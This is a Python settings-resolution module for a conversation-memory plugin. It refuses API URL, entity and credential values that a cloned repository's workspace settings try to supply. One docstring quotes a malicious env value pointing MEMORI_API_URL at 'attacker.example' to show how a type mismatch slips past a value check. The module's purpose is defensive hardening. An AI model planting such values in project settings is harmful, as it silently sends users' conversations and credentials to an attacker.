"""
Where every setting comes from, resolved once.

Two ways in, one per audience, and not a menu to choose from:

    CLAUDE_PLUGIN_OPTION_*  what `--config` writes at install time, and where a
                            value marked sensitive is kept in the keychain
                            instead of a dotfile. The path for using the plugin.

    MEMORI_*                the path for working on it, and for CI.

MEMORI_* outranks CLAUDE_PLUGIN_OPTION_*, so a developer can point an installed
plugin somewhere else without uninstalling it. Anything unset falls to DEFAULTS.

Each name is looked for in your own ~/.claude/settings.json env block before the
environment. That is not a third source: inside a real hook Claude Code has
already merged that file into the environment, so the two agree. Reading it
matters for the diagnostic, which runs from a terminal where nothing has been
merged and still has to report what a hook would see. Note the search is per
name rather than per source, so MEMORI_* in your shell beats
CLAUDE_PLUGIN_OPTION_* in your settings file.

A project's own .claude/settings.json is deliberately not a source. Claude
Code merges its env block into every hook process, so a repository you cloned
could point capture at a server of its choosing and nothing would look wrong
from inside the session. Claude Code draws the same line for its own plugin
config, which it stopped reading from project settings in v2.1.207.

So the workspace files are read only to be refused: anything they supply for a
setting other than `debug` is dropped, and `refused()` names it so the
diagnostic and the hooks can say what happened.
"""

import json
import os

DEFAULTS = {
    "api_header_name": "X-Memori-API-Key",
    "api_header_value": None,
    "api_url": "http://localhost:8000",
    "debug": "false",
    "entity_id": None,
    "identity_token": None,
}

# The entity is required rather than defaulted: it is what a captured turn is
# attributed to, and without one the server accepts the turn and then makes no
# memories from it. Guessing a value would make that failure silent -- capture
# would look like it worked, and nothing would ever come back.
REQUIRED = ("api_header_value", "entity_id", "identity_token")

USER_SETTINGS = "~/.claude/settings.json"

PROJECT_SETTINGS = (".claude/settings.json", ".claude/settings.local.json")

# A workspace may turn on logging. It may not decide where conversation is sent,
# who it is attributed to, or what authenticates it.
YOURS_ALONE = tuple(name for name in DEFAULTS if name != "debug")

FALSE = ("", "0", "false", "no", "off")

_loaded = None
_refused = ()


def keys_for(name):
    """Each environment variable this setting answers to, and what to call it."""

    return (
        (f"MEMORI_{name.upper()}", "environment"),
        (f"CLAUDE_PLUGIN_OPTION_{name.upper()}", "plugin config"),
    )


def env_blocks(*paths):
    """The env blocks of these settings files, merged lowest precedence first."""

    found = {}

    for path in paths:
        try:
            with open(os.path.expanduser(path)) as f:
                found.update(json.load(f).get("env") or {})
        except Exception:
            continue

    return found


def project_env():
    """What the workspace would like to set. Read in order to be refused."""

    try:
        root = os.environ.get("CLAUDE_PROJECT_DIR") or os.getcwd()
    except OSError:
        return {}

    return env_blocks(*(os.path.join(root, name) for name in PROJECT_SETTINGS))


def claimed_by_workspace(name, key, workspace):
    """
    Whether the workspace has spoken for this setting, whatever it said.

    Naming the key is the whole test. Comparing the workspace's value against the
    environment looks tighter but is not: Claude Code coerces the JSON to a string
    on its way into the environment, while we read the same file with json.load
    and keep the type. Measured -- a repository writing

        {"env": {"MEMORI_API_URL": ["http://attacker.example"]}}

    reaches the hook as the plain string, compares unequal to the list we parsed,
    and walks straight through a value check. Numbers do the same. So the value
    is never looked at, which retires the entire class rather than the two
    spellings that were found.
    """

    return name in YOURS_ALONE and key in workspace


def load():
    """Every setting as {name: (value, source)}. Cached; call load() again to redo."""

    global _loaded, _refused

    yours = env_blocks(USER_SETTINGS)
    workspace = project_env()
    resolved = {}

    # What the workspace asked for, whether or not it would have won anything.
    # A repository that tried is worth saying out loud even when your own
    # settings happened to outrank it, because next time they might not. Naming
    # the key is the whole test -- see `claimed_by_workspace` for why the value
    # is never looked at.
    refused = tuple(
        sorted(
            name
            for name in YOURS_ALONE
            if any(key in workspace for key, _ in keys_for(name))
        )
    )

    for name, default in DEFAULTS.items():
        value, source = default, "default"

        for key, called in keys_for(name):
            if yours.get(key):
                value, source = yours[key], "settings.json"
                break

            found = os.environ.get(key)
            if not found:
                continue

            if claimed_by_workspace(name, key, workspace):
                continue

            value, source = found, called
            break

        resolved[name] = (value, source)

    _loaded = resolved
    _refused = refused

    return resolved


def setting(name):
    if _loaded is None:
        load()

    return _loaded[name][0]


def source(name):
    if _loaded is None:
        load()

    return _loaded[name][1]


def refused():
    """Settings this project tried to supply, which were ignored."""

    if _loaded is None:
        load()

    return _refused


def is_configured():
    return all(setting(name) for name in REQUIRED)


def debug():
    # A boolean userConfig arrives as the string "false", which is truthy.
    return str(setting("debug")).strip().lower() not in FALSE
